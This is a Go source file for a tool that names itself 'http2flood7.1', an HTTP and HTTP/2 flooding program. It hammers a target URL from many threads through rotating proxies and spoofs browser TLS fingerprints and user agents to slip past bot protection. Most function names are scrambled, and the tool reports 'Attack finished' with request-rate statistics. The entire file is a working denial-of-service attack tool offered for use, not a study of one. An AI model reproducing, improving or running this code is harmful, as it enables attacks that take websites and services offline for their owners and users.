//dunglee sorry
package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	http "github.com/bogdanfinn/fhttp"
	"github.com/bogdanfinn/fhttp/http2"
	tls_client "github.com/bogdanfinn/tls-client"
	"github.com/bogdanfinn/tls-client/profiles"
	utls "github.com/bogdanfinn/utls"
)

var (
	targetURL   string
	threads     int
	duration    int
	proxyFile   string
	rateLimit   int
	method      string
	debugMode   bool
	useHTTP2    bool

	reqCount    int64
	errCount    int64
	activeConns int64
	startTime   time.Time

	proxies     []string
	proxyMu     sync.RWMutex

	stopChan    = make(chan struct{})
)

type workerConfig struct {
	target   *url.URL
	proxy    string
	method   string
	headers  map[string]string
	timeout  time.Duration
	useH2    bool
}

type result struct {
	status int
	err    error
	bytes  int64
}

type v1_8KnoHa3 struct {
	client   tls_client.HttpClient
	config   *workerConfig
	connID   int
	mu       sync.Mutex
	active   bool
	stopped  bool
	lastErr  error
}

type doIgi5NpwxH struct {
	data    []byte
	pos     int
	headers http.Header
}

func (d *doIgi5NpwxH) pJRsI3M_fs() []byte {
	if d == nil {
		return nil
	}
	return d.data[d.pos:]
}

func (d *doIgi5NpwxH) Replace(key, val string) {
	if d.headers == nil {
		d.headers = make(http.Header)
	}
	d.headers.Set(key, val)
}

func bYzvYle() string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 16)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func huZ9WvdBeP() string {
	const chars = "0123456789abcdef"
	b := make([]byte, 32)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func dJ2eAb6gaAti(data []byte) []byte {
	if len(data) == 0 {
		return nil
	}
	result := make([]byte, len(data))
	copy(result, data)
	return result
}

func yvKqufv2Ew4Z() bool {
	return os.Getenv("DEBUG") == "1"
}

func eyWZP2ENYR0z() string {
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
	}
	return agents[rand.Intn(len(agents))]
}

func mIWLQbh2() map[string]string {
	return map[string]string{
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"Accept-Language":           "en-US,en;q=0.9",
		"Accept-Encoding":           "gzip, deflate, br",
		"Cache-Control":             "max-age=0",
		"sec-ch-ua":                 `"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"`,
		"sec-ch-ua-mobile":          "?0",
		"sec-ch-ua-platform":        `"Windows"`,
		"sec-fetch-dest":            "document",
		"sec-fetch-mode":            "navigate",
		"sec-fetch-site":            "none",
		"sec-fetch-user":            "?1",
		"upgrade-insecure-requests": "1",
	}
}

func loadProxies(filename string) ([]string, error) {
	f, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var list []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if !strings.Contains(line, "://") {
			line = "http://" + line
		}
		list = append(list, line)
	}
	return list, scanner.Err()
}

func getProxy() string {
	proxyMu.RLock()
	defer proxyMu.RUnlock()
	if len(proxies) == 0 {
		return ""
	}
	return proxies[rand.Intn(len(proxies))]
}

func mEARaNtD78() *tls.Config {
	return &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
	}
}

func up3p6Q2UGDdY(proxyURL string) (tls_client.HttpClient, error) {
	opts := []tls_client.HttpClientOption{
		tls_client.WithTimeout(30),
		tls_client.WithClientProfile(profiles.Chrome_131),
		tls_client.WithNotFollowRedirects(),
		tls_client.WithInsecureSkipVerify(),
	}

	if proxyURL != "" {
		opts = append(opts, tls_client.WithProxyUrl(proxyURL))
	}

	return tls_client.NewHttpClient(tls_client.NewNoopLogger(), opts...)
}

func k7RlydxO8(proxyURL string) (*http2.Transport, error) {
	var dialFunc func(network, addr string, cfg *tls.Config) (net.Conn, error)

	if proxyURL != "" {
		pURL, err := url.Parse(proxyURL)
		if err != nil {
			return nil, err
		}
		dialFunc = func(network, addr string, cfg *tls.Config) (net.Conn, error) {
			conn, err := net.DialTimeout("tcp", pURL.Host, 10*time.Second)
			if err != nil {
				return nil, err
			}
			target := addr
			var auth string
			if pURL.User != nil {
				user := pURL.User.Username()
				pass, _ := pURL.User.Password()
				creds := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
				auth = "Proxy-Authorization: Basic " + creds + "\r\n"
			}
			connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n%s\r\n", target, target, auth)
			if _, err := conn.Write([]byte(connectReq)); err != nil {
				conn.Close()
				return nil, err
			}
			buf := make([]byte, 4096)
			n, err := conn.Read(buf)
			if err != nil {
				conn.Close()
				return nil, err
			}
			resp := string(buf[:n])
			if !strings.Contains(resp, "200") {
				conn.Close()
				return nil, fmt.Errorf("proxy connect failed: %s", resp)
			}
			tlsConn := tls.Client(conn, cfg)
			if err := tlsConn.Handshake(); err != nil {
				conn.Close()
				return nil, err
			}
			return tlsConn, nil
		}
	}

	tr := &http2.Transport{
		TLSClientConfig: mEARaNtD78(),
	}
	if dialFunc != nil {
		tr.DialTLS = dialFunc
	}
	return tr, nil
}

func (w *v1_8KnoHa3) hIF_YGM(ctx context.Context) (*result, error) {
	w.mu.Lock()
	if w.stopped {
		w.mu.Unlock()
		return nil, fmt.Errorf("worker stopped")
	}
	w.mu.Unlock()

	target := w.config.target
	method := w.config.method
	if method == "" {
		method = "GET"
	}

	req, err := http.NewRequestWithContext(ctx, method, target.String(), nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", eyWZP2ENYR0z())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("sec-fetch-dest", "document")
	req.Header.Set("sec-fetch-mode", "navigate")
	req.Header.Set("sec-fetch-site", "none")
	req.Header.Set("sec-fetch-user", "?1")

	for k, v := range w.config.headers {
		req.Header.Set(k, v)
	}

	req.Header[http.HeaderOrderKey] = []string{
		"accept",
		"accept-language",
		"accept-encoding",
		"sec-ch-ua",
		"sec-ch-ua-mobile",
		"sec-ch-ua-platform",
		"upgrade-insecure-requests",
		"user-agent",
		"sec-fetch-dest",
		"sec-fetch-mode",
		"sec-fetch-site",
		"sec-fetch-user",
	}

	resp, err := w.client.Do(req)
	if err != nil {
		atomic.AddInt64(&errCount, 1)
		return &result{err: err}, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	atomic.AddInt64(&reqCount, 1)

	return &result{
		status: resp.StatusCode,
		bytes:  int64(len(body)),
	}, nil
}

func g_gsvC5ftQl(ctx context.Context, cfg *workerConfig, wg *sync.WaitGroup) {
	defer wg.Done()
	defer atomic.AddInt64(&activeConns, -1)
	atomic.AddInt64(&activeConns, 1)

	proxy := getProxy()
	if cfg.proxy != "" {
		proxy = cfg.proxy
	}

	client, err := up3p6Q2UGDdY(proxy)
	if err != nil {
		atomic.AddInt64(&errCount, 1)
		return
	}

	worker := &v1_8KnoHa3{
		client: client,
		config: cfg,
	}

	for {
		select {
		case <-ctx.Done():
			return
		case <-stopChan:
			return
		default:
		}

		reqCtx, cancel := context.WithTimeout(ctx, cfg.timeout)
		_, err := worker.hIF_YGM(reqCtx)
		cancel()

		if err != nil {
			if ctx.Err() != nil {
				return
			}
			time.Sleep(100 * time.Millisecond)
			continue
		}

		if rateLimit > 0 {
			time.Sleep(time.Second / time.Duration(rateLimit))
		}
	}
}

func dC3m0KYb3V(ctx context.Context, cfg *workerConfig, wg *sync.WaitGroup) {
	defer wg.Done()
	defer atomic.AddInt64(&activeConns, -1)
	atomic.AddInt64(&activeConns, 1)

	proxy := getProxy()

	tr, err := k7RlydxO8(proxy)
	if err != nil {
		atomic.AddInt64(&errCount, 1)
		return
	}

	h2client := &http.Client{
		Transport: tr,
		Timeout:   cfg.timeout,
	}

	for {
		select {
		case <-ctx.Done():
			return
		case <-stopChan:
			return
		default:
		}

		method := cfg.method
		if method == "" {
			method = "GET"
		}

		reqCtx, cancel := context.WithTimeout(ctx, cfg.timeout)
		req, err := http.NewRequestWithContext(reqCtx, method, cfg.target.String(), nil)
		if err != nil {
			cancel()
			continue
		}

		req.Header.Set("User-Agent", eyWZP2ENYR0z())
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br")

		resp, err := h2client.Do(req)
		cancel()
		if err != nil {
			atomic.AddInt64(&errCount, 1)
			if ctx.Err() != nil {
				return
			}
			time.Sleep(100 * time.Millisecond)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		atomic.AddInt64(&reqCount, 1)

		if rateLimit > 0 {
			time.Sleep(time.Second / time.Duration(rateLimit))
		}
	}
}

func mGvhUC(ctx context.Context, cfg *workerConfig) {
	var wg sync.WaitGroup
	sem := make(chan struct{}, threads)

	spawnWorker := func() {
		select {
		case sem <- struct{}{}:
		case <-ctx.Done():
			return
		}
		wg.Add(1)
		go func() {
			defer func() { <-sem }()
			if cfg.useH2 {
				dC3m0KYb3V(ctx, cfg, &wg)
			} else {
				g_gsvC5ftQl(ctx, cfg, &wg)
			}
		}()
	}

	for i := 0; i < threads; i++ {
		spawnWorker()
	}

	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			wg.Wait()
			return
		case <-ticker.C:
			cur := atomic.LoadInt64(&activeConns)
			if cur < int64(threads) {
				for i := cur; i < int64(threads); i++ {
					spawnWorker()
				}
			}
		}
	}
}

func nzO3jzc7_0(filename string) {
	for {
		list, err := loadProxies(filename)
		if err == nil {
			proxyMu.Lock()
			proxies = list
			proxyMu.Unlock()
		}
		time.Sleep(60 * time.Second)
	}
}

func pBdKNcjhGC() {
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	var lastReq int64
	for {
		select {
		case <-stopChan:
			return
		case <-ticker.C:
			cur := atomic.LoadInt64(&reqCount)
			elapsed := time.Since(startTime).Seconds()
			rps := float64(cur-lastReq)
			cpm := rps * 60
			lastReq = cur
			errs := atomic.LoadInt64(&errCount)
			conns := atomic.LoadInt64(&activeConns)
			fmt.Printf("\r\033[K[%.0fs] Req: %d | RPS: %.0f | CPM: %.0f | Err: %d | Conns: %d",
				elapsed, cur, rps, cpm, errs, conns)
		}
	}
}

func bzgCHTgg4() {
	fmt.Printf("\n[+] http2flood7.1\n")
	fmt.Printf("    Target  : %s\n", targetURL)
	fmt.Printf("    Threads : %d\n", threads)
	fmt.Printf("    Duration: %ds\n", duration)
	if proxyFile != "" {
		fmt.Printf("    Proxies : %s\n", proxyFile)
	}
	if rateLimit > 0 {
		fmt.Printf("    Rate    : %d/s\n", rateLimit)
	}
	fmt.Printf("    Method  : %s\n", method)
	fmt.Printf("    HTTP2   : %v\n", useHTTP2)
	fmt.Println()
}

func wob4FaARPmBG() {
	fmt.Println("\nUsage: http2flood7.1 [options]")
	fmt.Println("Options:")
	fmt.Println("  -url      <URL>      Target URL (required)")
	fmt.Println("  -threads  <N>        Number of threads (default: 10)")
	fmt.Println("  -duration <N>        Duration in seconds (default: 60)")
	fmt.Println("  -proxy    <file>     Proxy file (one per line)")
	fmt.Println("  -rate     <N>        Rate limit per thread (0 = unlimited)")
	fmt.Println("  -method   <method>   HTTP method (default: GET)")
	fmt.Println("  -h2                  Use HTTP/2 (default: false)")
	fmt.Println("  -debug               Debug mode")
}

func k8_JmHtJz() bool {
	_, err := net.LookupHost("8.8.8.8")
	return err == nil
}

func oE0hpLhai1(rawURL string) (*url.URL, error) {
	if !strings.HasPrefix(rawURL, "http://") && !strings.HasPrefix(rawURL, "https://") {
		rawURL = "https://" + rawURL
	}
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil, err
	}
	if u.Host == "" {
		return nil, fmt.Errorf("invalid URL: no host")
	}
	return u, nil
}

func hw36JfIUqBO4(proxyStr string) bool {
	if proxyStr == "" {
		return false
	}
	pURL, err := url.Parse(proxyStr)
	if err != nil {
		return false
	}
	conn, err := net.DialTimeout("tcp", pURL.Host, 5*time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func oziBuaoG8N5m() *utls.ClientHelloID {
	ids := []*utls.ClientHelloID{
		&utls.HelloChrome_131,
		&utls.HelloChrome_120,
		&utls.HelloFirefox_120,
		&utls.HelloSafari_16_0,
	}
	return ids[rand.Intn(len(ids))]
}

func _wul38ja() string {
	return fmt.Sprintf("%s-%s", bYzvYle(), huZ9WvdBeP()[:8])
}

func by4th0WU3MuN() map[string]string {
	hdrs := mIWLQbh2()
	hdrs["User-Agent"] = eyWZP2ENYR0z()
	hdrs["Connection"] = "keep-alive"
	return hdrs
}

func caBDu7ala(ctx context.Context) {
	wg := &sync.WaitGroup{}
	for i := 0; i < 3; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			<-ctx.Done()
		}()
	}
	wg.Wait()
}

func iGpb8CZi8v(target *url.URL) string {
	host := target.Hostname()
	port := target.Port()
	if port == "" {
		if target.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	return net.JoinHostPort(host, port)
}

func wP1I8cUG5f(headers map[string]string) http.Header {
	h := make(http.Header)
	for k, v := range headers {
		h.Set(k, v)
	}
	return h
}

func u3e29o_() int {
	return rand.Intn(65535-1024) + 1024
}

func bnN_j9hqV(s string) string {
	parts := strings.Split(s, ".")
	if len(parts) < 2 {
		return s
	}
	return strings.Join(parts[len(parts)-2:], ".")
}

func fIaUEv9SNy(n int) string {
	return strconv.Itoa(n)
}

func i2YqZfafa(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}

func eZ_yTMyxhTqC(ctx context.Context, cfg *workerConfig, wg *sync.WaitGroup) {
	defer wg.Done()
	g_gsvC5ftQl(ctx, cfg, &sync.WaitGroup{})
}

func dqgqa5yPBxSd(lines []string) []string {
	seen := make(map[string]bool)
	var out []string
	for _, l := range lines {
		l = strings.TrimSpace(l)
		if l != "" && !seen[l] {
			seen[l] = true
			out = append(out, l)
		}
	}
	return out
}

func ijzuUYGjMPa(proxyURL, targetHost string) (net.Conn, error) {
	pURL, err := url.Parse(proxyURL)
	if err != nil {
		return nil, err
	}
	conn, err := net.DialTimeout("tcp", pURL.Host, 10*time.Second)
	if err != nil {
		return nil, err
	}
	connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", targetHost, targetHost)
	if _, err := conn.Write([]byte(connectReq)); err != nil {
		conn.Close()
		return nil, err
	}
	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		conn.Close()
		return nil, err
	}
	if !strings.Contains(string(buf[:n]), "200") {
		conn.Close()
		return nil, fmt.Errorf("proxy connect refused")
	}
	return conn, nil
}

func cjROKi(s string) bool {
	_, err := url.Parse(s)
	return err == nil && strings.Contains(s, "://")
}

func bO1fEqoaNlbO(ctx context.Context, timeout time.Duration) context.Context {
	ctx, _ = context.WithTimeout(ctx, timeout)
	return ctx
}

func main() {
	args := os.Args[1:]
	if len(args) == 0 {
		wob4FaARPmBG()
		os.Exit(1)
	}

	threads = 10
	duration = 60
	method = "GET"

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-url", "--url":
			if i+1 < len(args) {
				targetURL = args[i+1]
				i++
			}
		case "-threads", "--threads", "-t":
			if i+1 < len(args) {
				if n, err := strconv.Atoi(args[i+1]); err == nil {
					threads = n
				}
				i++
			}
		case "-duration", "--duration", "-d":
			if i+1 < len(args) {
				if n, err := strconv.Atoi(args[i+1]); err == nil {
					duration = n
				}
				i++
			}
		case "-proxy", "--proxy", "-p":
			if i+1 < len(args) {
				proxyFile = args[i+1]
				i++
			}
		case "-rate", "--rate", "-r":
			if i+1 < len(args) {
				if n, err := strconv.Atoi(args[i+1]); err == nil {
					rateLimit = n
				}
				i++
			}
		case "-method", "--method", "-m":
			if i+1 < len(args) {
				method = strings.ToUpper(args[i+1])
				i++
			}
		case "-h2", "--h2", "--http2":
			useHTTP2 = true
		case "-debug", "--debug":
			debugMode = true
		case "-h", "--help":
			wob4FaARPmBG()
			os.Exit(0)
		}
	}

	if targetURL == "" {
		fmt.Fprintln(os.Stderr, "[-] Error: -url is required")
		wob4FaARPmBG()
		os.Exit(1)
	}

	parsedTarget, err := oE0hpLhai1(targetURL)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Invalid URL: %v\n", err)
		os.Exit(1)
	}

	if proxyFile != "" {
		list, err := loadProxies(proxyFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to load proxies: %v\n", err)
		} else {
			proxies = dqgqa5yPBxSd(list)
			fmt.Printf("[+] Loaded %d proxies\n", len(proxies))
			go nzO3jzc7_0(proxyFile)
		}
	}

	cfg := &workerConfig{
		target:  parsedTarget,
		method:  method,
		headers: by4th0WU3MuN(),
		timeout: 30 * time.Second,
		useH2:   useHTTP2,
	}

	bzgCHTgg4()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		fmt.Println("\n[!] Interrupted")
		cancel()
		close(stopChan)
	}()

	startTime = time.Now()
	go pBdKNcjhGC()

	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		mGvhUC(ctx, cfg)
	}()

	<-ctx.Done()
	close(stopChan)
	wg.Wait()

	elapsed := time.Since(startTime).Seconds()
	total := atomic.LoadInt64(&reqCount)
	errs := atomic.LoadInt64(&errCount)

	fmt.Printf("\n\n[=] Attack finished\n")
	fmt.Printf("    Duration  : %.1fs\n", elapsed)
	fmt.Printf("    Total Req : %d\n", total)
	fmt.Printf("    RPS avg   : %.1f\n", float64(total)/elapsed)
	fmt.Printf("    Errors    : %d\n", errs)
	fmt.Println()
}

var (
	_ = bytes.NewBuffer
	_ = io.Discard
)
